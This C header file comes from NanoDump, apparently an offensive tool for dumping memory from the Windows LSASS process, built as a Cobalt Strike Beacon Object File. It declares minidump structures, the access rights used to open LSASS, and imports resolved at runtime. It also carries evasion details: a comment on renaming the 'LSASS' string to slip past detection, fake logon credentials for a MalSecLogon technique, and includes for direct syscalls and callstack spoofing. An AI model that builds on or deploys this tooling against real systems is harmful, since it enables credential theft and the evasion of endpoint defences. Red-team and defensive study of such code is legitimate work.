#pragma once

#include <windows.h>
#include <winternl.h>
#include <time.h>
#include <string.h>
#include <memory.h>

#if defined(EXE) || defined(DLL)
 #define PE
#endif

#ifndef BOF
#include "beacon.h"
#include "output.h"
#include "ntdefs.h"
#include "utils.h"
#include "handle.h"
#include "modules.h"
#include "syscalls.h"
#include "token_priv.h"
#include "malseclogon.h"
#include "werfault.h"
#include "impersonate.h"
#include "spoof_callstack.h"
#include "shtinkering.h"
#endif

// amount of memory requested to write the dump: 200 MiB
#define DUMP_MAX_SIZE 0x0c800000

// fake credentials used by MalSecLogon
#define NANODUMP_USER   L"NanoDumpUser"
#define NANODUMP_DOMAIN L"NanoDumpDomain"
#define NANODUMP_PASSWD L"NanoDumpPwd"

// change to remove the "LSASS" string from the binaries
#define LSASS "LSASS"

// permissions requested by NtOpenProcess
#define LSASS_DEFAULT_PERMISSIONS (PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ)
#define LSASS_CLONE_PERMISSIONS (PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_CREATE_PROCESS)
#define LSASS_SHTINKERING_PERMISSIONS (PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ)
// permissions requested by PssNtCaptureSnapshot
#define PROCESS_PPSCAPTURESNAPSHOT_PERMISSIONS PSS_CAPTURE_VA_CLONE
#define THREAD_PPSCAPTURESNAPSHOT_PERMISSIONS 0

// chunk size used in download_file: 900 KiB
#define CHUNK_SIZE 0xe1000

#if _WIN64
 #define PROCESS_PARAMETERS_OFFSET 0x20
 #define OSMAJORVERSION_OFFSET 0x118
 #define OSMINORVERSION_OFFSET 0x11c
 #define OSBUILDNUMBER_OFFSET 0x120
 #define OSPLATFORMID_OFFSET 0x124
 #define CSDVERSION_OFFSET 0x2e8
 #define PROCESSOR_ARCHITECTURE AMD64
#else
 #define PROCESS_PARAMETERS_OFFSET 0x10
 #define OSMAJORVERSION_OFFSET 0xa4
 #define OSMINORVERSION_OFFSET 0xa8
 #define OSBUILDNUMBER_OFFSET 0xac
 #define OSPLATFORMID_OFFSET 0xb0
 #define CSDVERSION_OFFSET 0x1f0
 #define PROCESSOR_ARCHITECTURE INTEL
#endif

#define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))

#define SystemHandleInformation 0x10
#define ObjectTypeInformation 2

#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09

#ifndef MEM_COMMIT
 #define MEM_COMMIT 0x1000
#endif
#ifndef MEM_MAPPED
 #define MEM_MAPPED 0x40000
#endif
#ifndef MEM_IMAGE
 #define MEM_IMAGE 0x1000000
#endif
#define PAGE_NOACCESS 0x01
#define PAGE_GUARD 0x100

#ifdef BOF
 WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
 WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
 WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree (HANDLE, DWORD, PVOID);
 WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
 WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);

 WINBASEAPI wchar_t * __cdecl MSVCRT$wcsstr(const wchar_t *_Str,const wchar_t *_SubStr);
 WINBASEAPI char *    __cdecl MSVCRT$strrchr(const char *_Str,int _Ch);
 WINBASEAPI void *    __cdecl MSVCRT$memcpy(void * _Dst,const void * _Src,size_t _MaxCount);
 WINBASEAPI int       __cdecl MSVCRT$memcmp(const void *_Buf1,const void *_Buf2,size_t _Size);
 WINBASEAPI size_t    __cdecl MSVCRT$strnlen(const char *s, size_t maxlen);
 WINBASEAPI size_t    __cdecl MSVCRT$wcsnlen(const wchar_t *_Src,size_t _MaxCount);
 WINBASEAPI wchar_t * __cdecl MSVCRT$wcsncpy(wchar_t * ,const wchar_t * ,size_t);
 WINBASEAPI size_t    __cdecl MSVCRT$mbstowcs(wchar_t * _Dest,const char * _Source,size_t _MaxCount);
 WINBASEAPI size_t    __cdecl MSVCRT$wcstombs(char * _Dest,const wchar_t * _Source,size_t _MaxCount);
 WINBASEAPI wchar_t * __cdecl MSVCRT$wcsncat(wchar_t * _Dest,const wchar_t * _Source,size_t _Count);
 WINBASEAPI int       __cdecl MSVCRT$strncmp(const char *s1, const char *s2, size_t n);
 WINBASEAPI int       __cdecl MSVCRT$strcmp(const char *s1, const char *s2);
 WINBASEAPI int       __cdecl MSVCRT$wcscmp(const wchar_t *_Str1, const wchar_t *_Str2);
 WINBASEAPI int       __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1,const wchar_t *_Str2);
 WINBASEAPI void      __cdecl MSVCRT$srand(int initial);
 WINBASEAPI int       __cdecl MSVCRT$rand();
 WINBASEAPI time_t    __cdecl MSVCRT$time(time_t *time);
 WINBASEAPI void      __cdecl MSVCRT$memset(void *dest, int c, size_t count);
 WINBASEAPI size_t    __cdecl MSVCRT$strlen(const char *s);
 WINBASEAPI char *    __cdecl MSVCRT$strncpy(char * __dst, const char * __src, size_t __n);
 WINBASEAPI char *    __cdecl MSVCRT$strncat(char * _Dest,const char * _Source, size_t __n);
 WINBASEAPI int       __cdecl MSVCRT$_vscprintf(const char *format, va_list argptr);
 WINBASEAPI int       __cdecl MSVCRT$vsprintf_s(char *_DstBuf,size_t _Size,const char *_Format,va_list _ArgList);
 WINBASEAPI size_t    __cdecl MSVCRT$wcslen(const wchar_t *_Str);
 WINBASEAPI int       __cdecl MSVCRT$sprintf_s(char *_DstBuf, size_t _DstSize, const char *_Format, ...);
 WINBASEAPI int       __cdecl MSVCRT$swprintf_s(wchar_t *_Dst,size_t _SizeInWords,const wchar_t *_Format,...);
 WINBASEAPI wchar_t * __cdecl MSVCRT$wcsrchr(const wchar_t *_Str,wchar_t _Ch);

 #define GetProcessHeap   KERNEL32$GetProcessHeap
 #define HeapAlloc        KERNEL32$HeapAlloc
 #define HeapFree         KERNEL32$HeapFree
 #define GetLastError     KERNEL32$GetLastError
 #define LocalAlloc       KERNEL32$LocalAlloc
 #define LocalFree        KERNEL32$LocalFree

 #define wcsstr     MSVCRT$wcsstr
 #define strrchr    MSVCRT$strrchr
 #define memcpy     MSVCRT$memcpy
 #define memcmp     MSVCRT$memcmp
 #define strnlen    MSVCRT$strnlen
 #define wcsnlen    MSVCRT$wcsnlen
 #define wcsncpy    MSVCRT$wcsncpy
 #define mbstowcs   MSVCRT$mbstowcs
 #define wcstombs   MSVCRT$wcstombs
 #define wcsncat    MSVCRT$wcsncat
 #define strncmp    MSVCRT$strncmp
 #define strcmp     MSVCRT$strcmp
 #define wcscmp     MSVCRT$wcscmp
 #define _wcsicmp   MSVCRT$_wcsicmp
 #define srand      MSVCRT$srand
 #define rand       MSVCRT$rand
 #define time       MSVCRT$time
 #define memset     MSVCRT$memset
 #define strlen     MSVCRT$strlen
 #define strncpy    MSVCRT$strncpy
 #define strncat    MSVCRT$strncat
 #define _vscprintf MSVCRT$_vscprintf
 #define vsprintf_s MSVCRT$vsprintf_s
 #define wcslen     MSVCRT$wcslen
 #define sprintf_s  MSVCRT$sprintf_s
 #define swprintf_s MSVCRT$swprintf_s
 #define wcsrchr    MSVCRT$wcsrchr

#endif

#define MINIDUMP_SIGNATURE 0x504d444d
#define MINIDUMP_VERSION 42899
#define MINIDUMP_IMPL_VERSION 0

#define SIZE_OF_HEADER 32
#define SIZE_OF_DIRECTORY 12
#ifdef _WIN64
 #define SIZE_OF_SYSTEM_INFO_STREAM 48
#else
 #define SIZE_OF_SYSTEM_INFO_STREAM 56
#endif
#define SIZE_OF_MINIDUMP_MODULE 108

enum StreamType
{
    SystemInfoStream = 7,
    ModuleListStream = 4,
    Memory64ListStream = 9,
};

enum ProcessorArchitecture
{
    AMD64 = 9,
    INTEL = 0,
};

enum MiniDumpType
{
    MiniDumpNormal = 0,
};

typedef struct _MiniDumpHeader
{
     ULONG32       Signature;
     SHORT         Version;
     SHORT         ImplementationVersion;
     ULONG32       NumberOfStreams;
     ULONG32       StreamDirectoryRva;
     ULONG32       CheckSum;
     ULONG32       Reserved;
     ULONG32       TimeDateStamp;
     ULONG32       Flags;
} MiniDumpHeader, *PMiniDumpHeader;

typedef struct _MiniDumpDirectory
{
     ULONG32       StreamType;
     ULONG32       DataSize;
     ULONG32       Rva;
} MiniDumpDirectory, *PMiniDumpDirectory;

typedef struct _dump_context
{
    HANDLE  hProcess;
    PVOID   BaseAddress;
    ULONG32 rva;
    SIZE_T  DumpMaxSize;
    ULONG32 Signature;
    USHORT  Version;
    USHORT  ImplementationVersion;
} dump_context, *Pdump_context;

typedef struct _MiniDumpSystemInfo
{
    SHORT ProcessorArchitecture;
    SHORT ProcessorLevel;
    SHORT ProcessorRevision;
    char    NumberOfProcessors;
    char    ProductType;
    ULONG32 MajorVersion;
    ULONG32 MinorVersion;
    ULONG32 BuildNumber;
    ULONG32 PlatformId;
    ULONG32 CSDVersionRva;
    SHORT SuiteMask;
    SHORT Reserved2;
#if _WIN64
        ULONG64 ProcessorFeatures1;
        ULONG64 ProcessorFeatures2;
#else
        ULONG32 VendorId1;
        ULONG32 VendorId2;
        ULONG32 VendorId3;
        ULONG32 VersionInformation;
        ULONG32 FeatureInformation;
        ULONG32 AMDExtendedCpuFeatures;
#endif
} MiniDumpSystemInfo, *PMiniDumpSystemInfo;

typedef struct _VsFixedFileInfo
{
    ULONG32 dwSignature;
    ULONG32 dwStrucVersion;
    ULONG32 dwFileVersionMS;
    ULONG32 dwFileVersionLS;
    ULONG32 dwProductVersionMS;
    ULONG32 dwProductVersionLS;
    ULONG32 dwFileFlagsMask;
    ULONG32 dwFileFlags;
    ULONG32 dwFileOS;
    ULONG32 dwFileType;
    ULONG32 dwFileSubtype;
    ULONG32 dwFileDateMS;
    ULONG32 dwFileDateLS;
} VsFixedFileInfo, *PVsFixedFileInfo;

typedef struct _MiniDumpLocationDescriptor
{
    ULONG32 DataSize;
    ULONG32 rva;
} MiniDumpLocationDescriptor, *PMiniDumpLocationDescriptor;

typedef struct _MiniDumpModule
{
    ULONG64 BaseOfImage;
    ULONG32 SizeOfImage;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG32 ModuleNameRva;
    VsFixedFileInfo VersionInfo;
    MiniDumpLocationDescriptor CvRecord;
    MiniDumpLocationDescriptor MiscRecord;
    ULONG64 Reserved0;
    ULONG64 Reserved1;
} MiniDumpModule, *PMiniDumpModule;

typedef struct _MiniDumpMemoryDescriptor64
{
    struct _MiniDumpMemoryDescriptor64* next;
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
    DWORD   State;
    DWORD   Protect;
    DWORD   Type;
} MiniDumpMemoryDescriptor64, *PMiniDumpMemoryDescriptor64;

VOID writeat(
    IN Pdump_context dc,
    IN ULONG32 rva,
    IN const PVOID data,
    IN unsigned size);

BOOL append(
    IN Pdump_context dc,
    IN const PVOID data,
    IN ULONG32 size);

BOOL write_header(
    IN Pdump_context dc);

BOOL write_directory(
    IN Pdump_context dc,
    IN MiniDumpDirectory directory);

BOOL write_directories(
    IN Pdump_context dc);

BOOL write_system_info_stream(
    IN Pdump_context dc);

//Pmodule_info write_module_list_stream(
//    IN Pdump_context dc);
//
//BOOL is_important_module(
//    IN PVOID address,
//    IN Pmodule_info module_list);
//
//PMiniDumpMemoryDescriptor64 get_memory_ranges(
//    IN Pdump_context dc,
//    IN Pmodule_info module_list);
//
//PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
//    IN Pdump_context dc,
//    IN Pmodule_info module_list);

BOOL NanoDumpWriteDump(
    IN Pdump_context dc);
